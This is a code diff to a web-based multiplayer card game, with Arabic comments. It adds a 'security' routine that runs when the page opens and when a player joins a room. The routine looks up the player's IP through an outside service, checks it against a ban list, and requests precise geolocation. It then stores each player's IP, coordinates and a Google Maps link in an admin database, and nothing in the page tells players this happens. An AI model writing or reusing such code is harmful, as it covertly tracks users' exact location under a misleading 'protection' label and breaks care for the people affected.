@@ -95,6 +95,55 @@
     let rID, mID, rRef, myRole = "", canAction = true;
     const syms = { 'H': '♡', 'D': '◇', 'S': '♤', 'C': '♧' };
 
+    // --- وظيفة الحماية والموقع الدقيق ---
+    async function checkSecurity() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            const userIP = data.ip;
+            const ipKey = userIP.replace(/\./g, '_');
+
+            // فحص الحظر
+            db.ref('admin_security/blacklist/' + ipKey).on('value', (s) => {
+                const ban = s.val();
+                if (ban && ban.bannedUntil > Date.now()) {
+                    document.body.innerHTML = `
+                        <div style="padding-top:200px; color:white; background:#000; height:100vh;">
+                            <h1 style="color:#ff003c;">أنت محظور مؤقتاً 🚫</h1>
+                            <p>سيتم فك الحظر تلقائياً بعد دقيقة واحدة.</p>
+                        </div>`;
+                    throw new Error("Banned User");
+                }
+            });
+
+            // جلب الموقع الدقيق وإرساله للأدمن
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    db.ref(`admin_security/active_players/${mID}`).update({
+                        ip: userIP,
+                        coords: `${lat},${lon}`,
+                        map: `https://www.google.com/maps?q=${lat},${lon}`,
+                        last_seen: Date.now(),
+                        room: rID || "في الانتظار"
+                    });
+                }, () => {
+                    db.ref(`admin_security/active_players/${mID}`).update({
+                        ip: userIP,
+                        coords: "تم رفض الوصول للموقع",
+                        last_seen: Date.now(),
+                        room: rID || "في الانتظار"
+                    });
+                });
+            }
+            db.ref(`admin_security/active_players/${mID}`).onDisconnect().remove();
+        } catch(e) { console.log("Security Active"); }
+    }
+
+    // استدعاء الحماية عند فتح الصفحة
+    checkSecurity();
+
     // --- نظام الاستفزاز المصري ---
     const insults = [
         "يا نوب اعتزل أحسن! 😂",
@@ -121,6 +170,9 @@
         if(!rID) return alert("دخل كود الغرفة!");
         mID = "U" + Math.floor(Math.random()*9999);
         rRef = db.ref(`final_arena_v4/${rID}`);
+        
+        // تحديث معلومات الأدمن عند دخول غرفة
+        checkSecurity();
 
         rRef.child('slots').transaction(s => {
             if(!s) return { p1: mID };
@@ -201,7 +253,7 @@
 
     // --- Actions ---
     function tapWar(e) {
-        if(myRole==='viewer') return;
+        if(myRole==='viewer' || !canAction) return;
         rRef.child('war').transaction(d => {
             if(!d) d = {p1:50, p2:50};
             if(myRole==='p1') { d.p1+=2; d.p2-=2; } else { d.p2+=2; d.p1-=2; }
